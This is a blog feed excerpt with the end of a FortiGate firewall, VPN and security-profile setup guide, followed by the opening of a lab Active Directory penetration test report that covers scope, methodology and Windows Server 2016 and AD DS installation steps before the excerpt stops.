+&lt;ol>
+&lt;li>
+&lt;p>Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;Interfaces.&amp;rdquo;&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Locate the WAN interface and click on it to configure its settings.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Choose the &amp;ldquo;Static&amp;rdquo; or &amp;ldquo;DHCP&amp;rdquo; option, depending on how your ISP provides the WAN IP address:&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Static IP: If your ISP provides a static public IP address, select &amp;ldquo;Static&amp;rdquo; and enter the IP address, subnet mask, default gateway, and DNS server addresses provided by your ISP.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>DHCP: If your ISP uses DHCP to dynamically assign the WAN IP address, select &amp;ldquo;DHCP&amp;rdquo; for the WAN interface. The FortiGate will automatically obtain the IP address, subnet mask, default gateway, and DNS servers from the ISP.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 3: PPPoE Configuration (if needed)&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>If your ISP requires PPPoE (Point-to-Point Protocol over Ethernet) authentication, select &amp;ldquo;PPPoE&amp;rdquo; for the WAN interface and enter the PPPoE username and password provided by your ISP.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 4: Additional WAN Settings (if needed)&lt;/strong>&lt;/p>
+&lt;p>Depending on your network setup and ISP requirements, you may need to configure additional settings like MTU (Maximum Transmission Unit), VLAN (Virtual LAN), or link speed/duplex mode for the WAN interface. Consult your ISP or network administrator for specific requirements.&lt;/p>
+&lt;p>&lt;strong>Step 5: DNS Configuration&lt;/strong>&lt;/p>
+&lt;p>Set up DNS servers to resolve domain names. Go to &amp;ldquo;Network&amp;rdquo; to &amp;ldquo;DNS&amp;rdquo; and enter the IP addresses of your preferred DNS servers.&lt;/p>
+&lt;p>&lt;strong>Step 6: Apply Configuration&lt;/strong>&lt;/p>
+&lt;p>Review your settings and click &amp;ldquo;Apply&amp;rdquo; to save the changes.&lt;/p>
+&lt;p>&lt;strong>Firewall Policies:&lt;/strong>&lt;/p>
+&lt;p>Set up firewall policies to control traffic between different network segments and the internet. Define rules for allowing or blocking specific services and applications.&lt;/p>
+&lt;p>&lt;strong>Step 1: Accessing the FortiGate Web Interface&lt;/strong>&lt;/p>
+&lt;p>Connect a computer to the FortiGate using an Ethernet cable.&lt;/p>
+&lt;p>Open a web browser and enter the default IP address of the FortiGate (usually 192.168.1.99) in the address bar.&lt;/p>
+&lt;p>Log in with the administrator credentials.&lt;/p>
+&lt;p>&lt;strong>Step 2: Creating Firewall Policies&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Go to &amp;ldquo;Policy &amp;amp; Objects&amp;rdquo; to &amp;ldquo;IPv4 Policy.&amp;rdquo;&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Click on &amp;ldquo;Create New&amp;rdquo; to add a new firewall policy.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Define the parameters for the firewall policy:&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Source Interface: Select the interface where the traffic originates (e.g., LAN or WAN).&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Source Address: Specify the source IP address or IP range for the traffic.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Destination Interface: Select the interface where the traffic is destined (e.g., LAN or WAN).&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Destination Address: Specify the destination IP address or IP range for the traffic.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Schedule: Optionally, set a specific schedule for when the policy is active.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Service: Select the services or ports that the policy will allow or block.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Action: Choose &amp;ldquo;Accept&amp;rdquo; to allow the traffic or &amp;ldquo;Deny&amp;rdquo; to block it.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Logging: Enable logging to track traffic matching this policy.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>VPN Setup:&lt;/strong>&lt;/p>
+&lt;p>Configure Virtual Private Networks (VPNs) if needed for secure remote access or site-to-site connectivity. Define authentication methods and encryption settings.&lt;/p>
+&lt;p>&lt;strong>Step 1: Pre-configuration&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>Ensure that the FortiGate device has been set up with basic network configurations, including WAN and LAN interfaces.&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 2: VPN Wizard&lt;/strong>&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Log in to the FortiGate web-based management interface using a web browser.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Navigate to &amp;ldquo;VPN&amp;rdquo; to &amp;ldquo;IPsec Wizard.&amp;rdquo;&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Select &amp;ldquo;Site to Site&amp;rdquo; VPN and follow the wizard to configure the following parameters:&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>VPN Name: A descriptive name for the VPN.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Local Interface: Choose FortiGate&amp;rsquo;s outgoing interface (usually the WAN interface).&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Local Subnet: Define the local network subnet to be connected via the VPN.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Remote Gateway: Enter the IP address or domain name of the remote VPN gateway.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Remote Subnet: Define the remote network subnet to be connected via the VPN.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Authentication Method: Choose a pre-shared key or certificate-based authentication.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Pre-shared Key: If using pre-shared key authentication, enter the shared secret.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Phase 1 Proposal: Define the encryption and authentication algorithms for phase 1 of the VPN tunnel.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Phase 2 Proposal: Define the encryption and authentication algorithms for phase 2 of the VPN tunnel.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Key Life Time: Set the key lifetime for phase 1 and phase 2.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;strong>Step 3: Firewall Policies&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>After creating the VPN tunnel, you may need to create firewall policies to allow traffic between the local and remote networks through the VPN tunnel. Go to &amp;ldquo;Policy &amp;amp; Objects&amp;rdquo; to &amp;ldquo;IPv4 Policy&amp;rdquo; and create the necessary policies.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>Step 4: Testing&lt;/strong> : Test the VPN connectivity by sending traffic between the local and remote networks through the VPN tunnel.&lt;/p>
+&lt;p>&lt;strong>Security Profiles:&lt;/strong>&lt;/p>
+&lt;p>Enable security profiles such as antivirus, intrusion prevention, and web filtering to protect against threats and malicious content.&lt;/p>
+&lt;p>&lt;strong>1. Antivirus:&lt;/strong>&lt;/p>
+&lt;p>Scans incoming and outgoing traffic for known viruses and malware.&lt;/p>
+&lt;p>Blocks infected files from entering the network and prevents malware from spreading.&lt;/p>
+&lt;p>&lt;strong>2. Intrusion Prevention System (IPS):&lt;/strong>&lt;/p>
+&lt;p>Inspects network traffic for known and unknown threats, including exploits and vulnerabilities.&lt;/p>
+&lt;p>Blocks malicious or suspicious activities in real-time.&lt;/p>
+&lt;p>&lt;strong>3. Web Filtering:&lt;/strong>&lt;/p>
+&lt;p>Controls access to websites based on categories, URLs, or specific keywords.&lt;/p>
+&lt;p>Helps prevent users from accessing malicious or inappropriate content.&lt;/p>
+&lt;p>&lt;strong>4. Application Control:&lt;/strong>&lt;/p>
+&lt;p>Manages and controls the usage of specific applications and services on the network.&lt;/p>
+&lt;p>Allows organizations to optimize bandwidth and enforce security policies.&lt;/p>
+&lt;p>&lt;strong>5. Data Loss Prevention (DLP):&lt;/strong>&lt;/p>
+&lt;p>Monitors and controls data flow in and out of the network to prevent sensitive data leaks.&lt;/p>
+&lt;p>Enforces policies to comply with data protection regulations.&lt;/p>
+&lt;p>&lt;strong>6. Advanced Threat Protection (ATP):&lt;/strong>&lt;/p>
+&lt;p>Includes sandboxing and behavior-based analysis to detect and mitigate zero-day threats.&lt;/p>
+&lt;p>Analyzes suspicious files and activities in a secure environment.&lt;/p>
+&lt;p>&lt;strong>7. SSL Inspection:&lt;/strong>&lt;/p>
+&lt;p>Decrypts and inspects SSL/TLS encrypted traffic to detect hidden threats.&lt;/p>
+&lt;p>Helps protect against threats that might be hidden in encrypted communications.&lt;/p>
+&lt;p>&lt;strong>8. Email Filtering (Anti-Spam):&lt;/strong>&lt;/p>
+&lt;p>Filters incoming emails to block spam, phishing attempts, and malicious attachments.&lt;/p>
+&lt;p>Helps maintain the security and integrity of email communications.&lt;/p>
+&lt;p>&lt;strong>9. DNS Filtering:&lt;/strong>&lt;/p>
+&lt;p>Filters DNS queries to block access to malicious domains and prevent data exfiltration.&lt;/p>
+&lt;p>&lt;strong>Web Filtering and Application Control:&lt;/strong>&lt;/p>
+&lt;p>Implement web filtering policies to restrict access to unwanted websites and create application control policies to manage application usage.&lt;/p>
+&lt;p>&lt;strong>Regular Updates and Maintenance:&lt;/strong>&lt;/p>
+&lt;p>Keep the FortiGate firmware and security definitions up to date. Conduct periodic security assessments and update configurations based on changing requirements.&lt;/p>
+&lt;p>&lt;strong>Continuous Monitoring:&lt;/strong>&lt;/p>
+&lt;p>Continuously monitor network traffic and security logs for potential threats or anomalies. Respond promptly to any security incidents.&lt;/p>
+&lt;h1 id="conclusion">CONCLUSION
+&lt;/h1>&lt;p>The FortiGate project is a significant advancement in data security and efficiency. It addresses data protection challenges with encryption, access controls, and authentication. User-friendly interface enhances productivity. Consider initial challenges, resource needs, and user training. Regular maintenance and updates are crucial. FortiGate mitigates data breach risks, preserving reputation and trust. Continuous improvements ensure it remains effective in the evolving cybersecurity landscape. Overall, FortiGate is a reliable and valuable solution for secure data management&lt;/p>
+&lt;h1 id="screenshots">SCREENSHOTS
+&lt;/h1>&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/t_iCdJY9t5j9N4a7vkWBLYR_CrrbeDcz6-8wV6fU70knN_lpcnN5pUo5MXGuARdEVHGNpJScx1Iydv8un_AKvTpw_4vqnsIbeoLGM8mkgiNdq5-Z0k6lIUHx-QBrtYsNbwacGHgW3_0GA7le_-tUsQ"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/hY1NpaLVHnqDLmF8UWUlZSiM75NrF4J3q7jtl-ZJa1hTs3uScSXT9GCUIcbkhOnwiAA0lYUAp6xJxGgHUAgtXIdx_J3n8eejfm385mAFhTcHiRpEt_Qk2FvXIvD0qUea6AR5sLEONHidw9A1riUajQ"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/BDLEhyALhLNJpmQfkxI7u9DT6lZUKLKLunwxFqyaLeMxoHYnhL_7sgpXhizbFbPkcM5oL1VwlMMsd5Sjo9vPtJEbftTXLrps6gClLYF7WYIB7xayAqDr0ZsTim6ivlobedbZgMF3oV8Uacud_Rq0rQ"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/Vzyghfuwfp84S0cqM0LYnu5ZpZRxZnb7V4_bhxA70jn3LQlkoERMYFrHMccV23yVM0FoyuXhp9bANnqqYc8MhsaDmSbt_vmeA7-CVfCkeo7NNKhZvz13TLo2_3QE4iuXF7vZqmM218gfJCCz6PTaCA"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/3kYZD_hDZMVgAj8xMVnfR6OaTuhoVwaahjfHXxxj4qGZwiQfD4G2xT1BAKXnhh8zCXRx6gpqunnZ_XwIwsP7yotREuZQumi28_oClraZGcwMbj3AOS-AOJOvUh2TwpjKqF2Ig2zjwgU_HcVu6BtIng"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/mDsNuMMDHs0KYb2YVfRA2cFySz-C38eRPnIG_CTTKo4TgAo9AhNyFaOs6aQZX9-ko6EfKcmOOZilscyxisDYQ2E9Nq3mqOKJc4VGVAotRXVVY8oNYd8DxKLSkox17bLZT9dteBP_cJDQs0hi2ke9NA"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/TOtxmolRSXaNoQZ_YdwzvJ-N8STJ26yndJAbQ1h7V1gdaZ-AxrrFJBQb7AkEBm9QMTmq6Dks2Qlqd8tVZU3HK0A7oxRuCOcUmks1LRzJ3czkf91MW1TsMEV1Y7oeHt7GykvJMiUIgFtRLul5jmqyaA"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/37L9y3DeyZUc9i_4H0y0SovT1h5foh9GVGHSe1MOFrai4ruyOFjUNQM92dkuTL2nib9QcIhxUL1X6Ov8o1wLNbwC8cbSiqq5rhe0SYNP71XJlH7f1zpifU3-99TsoMb6AMYkXo8X2NhupeYJ80gfZQ"
+loading="lazy"
+>&lt;/p>
+&lt;p>.&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/fOB_R5ap3Zrsb3gng11jeJarMuuMdHzABC504ac1WDMZADFQvAMRwwNFZaP18VAqjsIN65YzjjITXtxPByIFA17l4vuOTs05BDe-ifLer6oRUnlMm-4_mXj7bbhRXaH8G_h8MoUS-pyqMKiTwbAwzA"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/kqPBbDwdXWe5CB0UnkPzOE2O4JNiZuOE3-k5wXdOjPj4sxJAe1jTk3UEuszrJMcFFb9r-WYN8IGMkrqEkcnhw4acPogs4UA3SDsMkEptHUk3O2YsF6VftrzZ2c1KT5EEDbZUsdDuREsnZeuSuhND7A"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/q_xELubQZVCX0GoG-UeTkNtCcpYff6TzI7XemjE8_eI4GTGHdSRGF7Jtq6SjRGQPaqS9Xzgxe81VY6Q4txl7dy6Z1EukVHeP0Ld04B3qXkPSQww_anx43F0CvhFNHuwjp6XtYgUzQJntKf1O3VzM0A"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/V-AxSRhcz4UF-lta5m7TY6btcM6D5pwmPgbuH4aVZSYpmrYo2Wtl0YBf_-L7u5lOn7ykNayFAp2EoqbyyVQ9ID3OH_h1mZjgIubVoXKvhkYqp9bDwHA4D3wl2J6hRXKZ0BefdKszuRTzbnCVN9CKTQ"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/4CIAtSY5SOh38gipolYjwrk1UtaxTSPGzWSg6MvQda3alzDMF-vhlagoiVx7xmsisNxA8Pvlnq0_eaVD6xrCSvyUG_VX_evKNU8bADXHsnUGmPhUf-nx2w-UBTzP92AHa6m2S3VRU-eMwAU_P8uAOg"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/nF5duEqrzmhRiOvwiUjhxutbwPeVPma1CASSmfVxfjkAWDGrV4Wq6hP-szEJMegT4ZmBn6m-ZhfBxemFDtG8mbjWX5voXkh0okdQwL5UULjqSCrbAP8kK_yBwU9-nzP5SqlKyV7Mds9IRBzsHklVaA"
+loading="lazy"
+>&lt;/p>
+&lt;p>&lt;img src="https://lh7-us.googleusercontent.com/rq5XpFXV_8f0QjsclOwkmv4ZIMYEXNFCzYeW21L9899JV2DWEnfrk-n9uPz9bMiCqU_aDjSU_pme_BkMpQyWtGDKVhdpp-DLiF67P2p9l_RHx68fMsTD8sNaX1986s0MT3O8ppRdROxiaUk9pKkT8g"
+loading="lazy"
+>&lt;/p></description></item><item><title>Active Directory Penetration Test Report</title><link>https://orangeymango.me/p/active-directory-penetration-test-report/</link><pubDate>Sun, 18 Feb 2024 11:27:22 +0000</pubDate><guid>https://orangeymango.me/p/active-directory-penetration-test-report/</guid><description>&lt;img src="https://wolfcareers.com/wp-content/uploads/2023/01/1_cQGpZGkSuehv-YEXUweMQ-e1672674616339.webp" alt="Featured image of post Active Directory Penetration Test Report" />&lt;p>&lt;em>Date: February 14, 2024&lt;/em>&lt;/p>
+&lt;h2 id="table-of-contents">Table of Contents
+&lt;/h2>&lt;ol>
+&lt;li>Executive Summary&lt;/li>
+&lt;li>Introduction&lt;/li>
+&lt;li>Scope&lt;/li>
+&lt;li>Methodology&lt;/li>
+&lt;li>Findings
+&lt;ul>
+&lt;li>5.1 Windows Server 2016 Setup&lt;/li>
+&lt;li>5.2 Active Directory Configuration
+&lt;ul>
+&lt;li>5.2.1: Implementing Active Directory Domain Services (AD DS)&lt;/li>
+&lt;li>5.2.2: Establish Domain Controller Role on the Server&lt;/li>
+&lt;li>5.2.3: Configure Active Directory Parameters&lt;/li>
+&lt;li>5.2.4: Validate Active Directory Configuration&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>5.3 Attacks
+&lt;ul>
+&lt;li>5.3.1 Brute Force Attack&lt;/li>
+&lt;li>5.3.2 Password Spraying Attack&lt;/li>
+&lt;li>5.3.3 Asreproast attack&lt;/li>
+&lt;li>5.3.4 SQL Injection Attack&lt;/li>
+&lt;li>5.3.5 Command Injection Attack&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>5.4 BloodHound Analysis&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Recommendations&lt;/li>
+&lt;li>Risk Assessment&lt;/li>
+&lt;li>Regulatory Compliance Considerations&lt;/li>
+&lt;li>Long-Term Security Considerations&lt;/li>
+&lt;li>Disclaimer&lt;/li>
+&lt;li>Acknowledgments&lt;/li>
+&lt;li>Conclusion&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="1-executive-summary">1. Executive Summary
+&lt;/h2>&lt;p>The objective of the penetration test was to thoroughly assess the security of the Windows Server 2016 environment and Active Directory configuration, aiming to identify potential vulnerabilities exploitable by attackers. Various attack scenarios, including brute force attacks, password spraying attacks, ASREPRoast attacks, SQL injection attacks, and command injection attacks, were simulated to uncover critical weaknesses in the system.&lt;/p>
+&lt;p>Upon examination of the Windows Server 2016 setup, default configurations and delayed application of crucial security patches were discovered, leaving the system vulnerable to known exploits. Additionally, weaknesses in the Active Directory configuration were noted, such as weak password policies, inadequate access controls, and insufficient segregation of duties, increasing the risk of unauthorized access.&lt;/p>
+&lt;p>The findings highlight the urgent need for comprehensive remediation measures to strengthen the organization&amp;rsquo;s security posture. Recommendations include prioritizing regular patching and updates, enforcing robust password policies, reviewing and reinforcing least privilege access controls, implementing effective network segmentation, and conducting frequent security awareness training for employees.&lt;/p>
+&lt;p>Implementing these recommendations will significantly improve the organization&amp;rsquo;s security posture, reducing the likelihood of cyber threats and protecting its assets, reputation, and stakeholder confidence.&lt;/p>
+&lt;hr>
+&lt;h2 id="2-introduction">2. Introduction
+&lt;/h2>&lt;p>The goal of this penetration test was to evaluate Windows Server 2016 security in detail using an Active Directory environment that mimics a standard business infrastructure. Finding weaknesses and possible attack routes was the main goal in order to offer detailed suggestions for strengthening the security posture as a whole.&lt;/p>
+&lt;p>In the digital and linked world of today, businesses mostly depend on technological infrastructure to run their operations effectively. For enterprises looking to create a reliable and scalable network infrastructure, Windows Server 2016 together with Active Directory is a popular option. To reduce possible risks, enterprises must constantly assess and improve the infrastructure&amp;rsquo;s security due to the growing sophistication of cyberattacks.&lt;/p>
+&lt;p>Our objectives in doing this penetration test were to mimic actual attack scenarios and evaluate how resilient the Windows Server 2016 setup and Active Directory configuration were to different online threats. We sought to find flaws and vulnerabilities that may be used by bad actors to obtain unauthorized access, tamper with data integrity, or interfere with company operations using a combination of automated and human methods.&lt;/p>
+&lt;p>The firm will be able to improve its overall security posture by prioritizing repair activities, implementing efficient security controls, and making well-informed decisions about security investments thanks to the data gathered from this penetration test. The company may strengthen its defenses against cyberattacks and preserve the confidence of its stakeholders, assets, and reputation by promptly resolving vulnerabilities that are found and putting the suggested security measures into place.&lt;/p>
+&lt;p>In order to help the company mitigate risks and strengthen its security posture, we will offer comprehensive findings, analysis, and suggestions based on our evaluation throughout this report.&lt;/p>
+&lt;hr>
+&lt;h2 id="3-scope">3. Scope
+&lt;/h2>&lt;p>The scope of this penetration test included:&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>Setting up a Windows Server 2016 environment:&lt;/strong>
+&lt;ul>
+&lt;li>Creating and configuring a Windows Server 2016 environment with default settings to simulate a standard deployment scenario.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Configuring Active Directory to simulate a corporate network:&lt;/strong>
+&lt;ul>
+&lt;li>Configuring Active Directory (AD) services to replicate a corporate network environment, including organizational units, user accounts, group policies, and other AD objects.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Executing a minimum of five distinct attacks targeting the Windows Server environment:&lt;/strong>
+&lt;ul>
+&lt;li>Executing at least five different attack scenarios, covering common vectors such as Brute Force Attack, Password Spraying Attack, ASREPRoast Attack, SQL Injection Attack, Command Injection Attack.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Utilizing BloodHound for reconnaissance and privilege escalation:&lt;/strong>
+&lt;ul>
+&lt;li>Using BloodHound, a tool for analyzing Active Directory attack paths, to conduct reconnaissance and identify potential attack paths within the Active Directory environment, as well as to assess opportunities for privilege escalation.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="4-methodology">4. Methodology
+&lt;/h2>&lt;p>The penetration test employed a blend of manual and automated techniques to simulate real-world attack scenarios. Manual techniques involve the use of human expertise to identify and exploit vulnerabilities in the system, while automated techniques leverage specialized tools and scripts to rapidly scan for and exploit known vulnerabilities.&lt;/p>
+&lt;p>Various attack vectors were explored and exploited to evaluate the robustness of the system&amp;rsquo;s defenses. This included but was not limited to, network-based attacks such as port scanning, service enumeration, and exploitation of software vulnerabilities.&lt;/p>
+&lt;hr>
+&lt;h1 id="5-findings">5. Findings
+&lt;/h1>&lt;h2 id="51-windows-server-2016-setup">5.1 Windows Server 2016 Setup
+&lt;/h2>&lt;p>The Windows Server 2016 environment was configured with default settings, including standard services and configurations. However, critical security patches and updates were not promptly applied, leaving the system susceptible to known vulnerabilities.&lt;/p>
+&lt;p>Installation Process Overview:&lt;/p>
+&lt;p>&lt;strong>Prepare for Installation:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Download the Windows Server 2016 ISO from the Microsoft website or a licensed distributor.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Create a new virtual machine (VM) using VMware Workstation or similar software.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Attach the Windows Server 2016 ISO file to the VM&amp;rsquo;s virtual CD/DVD drive.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Adjust VM settings such as CPU cores, RAM, disk size, and network adapter settings.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled.png"
+loading="lazy"
+alt="image"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;strong>Boot from Installation Media:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Power on the VM and ensure it boots from the Windows Server 2016 installation ISO.&lt;/li>
+&lt;li>Press any key to boot from CD or DVD when prompted.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Start Installation:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Select language, time, and keyboard input preferences.&lt;/li>
+&lt;li>Click &amp;ldquo;Install Now&amp;rdquo; to begin the installation process.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Enter Product Key:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Optionally enter a product key for Windows Server 2016.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Select Operating System Edition:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Choose the desired edition of Windows Server 2016.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled1.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Accept License Terms:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Read and accept the license terms.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Choose Installation Type:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Select &amp;ldquo;Custom: Install Windows only (advanced)&amp;rdquo; for a clean installation.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled2.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Select Installation Drive:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Choose the drive for installation and configure partitions if necessary.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Begin Installation:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Start the installation process.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Complete Installation:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Remove the installation media (ISO file) from the virtual CD/DVD drive.&lt;/li>
+&lt;li>Follow on-screen instructions to set up Windows Server 2016, create user accounts, and configure network settings.&lt;/li>
+&lt;li>Log in to the Windows Server 2016 desktop.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Install VMware Tools:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Install VMware Tools for enhanced VM performance and additional features.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled3.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Finalize Configuration:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Customize additional Windows Server 2016 settings as needed.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;p>In summary, the Windows Server 2016 setup process involved downloading the ISO, creating a VM, installing the operating system, configuring settings, and finalizing the setup. However, it lacked timely application of critical security patches and updates, posing potential vulnerabilities to the system.&lt;/p>
+&lt;ul>
+&lt;li>Critical security patches and updates were not promptly applied, leaving the system susceptible to known vulnerabilities.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="52-active-directory-configuration">5.2 Active Directory Configuration
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>Active Directory was configured with default parameters, featuring weak password policies and inadequate access controls.&lt;/p>
+&lt;h3 id="521-implementing-active-directory-domain-services-ad-ds">5.2.1: Implementing Active Directory Domain Services (AD DS)
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>Launch Server Manager on the designated Windows Server 2016 machine.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Navigate to &amp;ldquo;Add roles and features&amp;rdquo; within Server Manager.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled4.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Select &amp;ldquo;Role-based or feature-based installation&amp;rdquo; to align with best practices and proceed accordingly..&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Select the appropriate server from the pool and initiate the installation process.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Choose &amp;ldquo;Active Directory Domain Services&amp;rdquo; from the list of server roles and add required features.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled5.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Review the provided information about AD DS and commence the installation.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="522-establish-domain-controller-role-on-the-server">5.2.2: Establish Domain Controller Role on the Server
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>Upon completion of the installation, initiate the promotion of the server to a domain controller.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled6.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Utilize the Active Directory Domain Services Configuration Wizard to specify whether to add a new forest or domain controller.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled7.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Provide essential details such as the root domain name, forest, and domain functional levels.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Set a Directory Services Restore Mode (DSRM) password and review configuration options.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Execute the promotion process and allow the server to restart automatically.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h3 id="523-configure-active-directory-parameters">5.2.3: Configure Active Directory Parameters
+&lt;/h3>&lt;ol>
+&lt;li>
+&lt;p>Post-restart, access the system using the domain administrator account.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Utilize Server Manager to access &amp;ldquo;Active Directory Users and Computers.&amp;rdquo;&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled8.png"
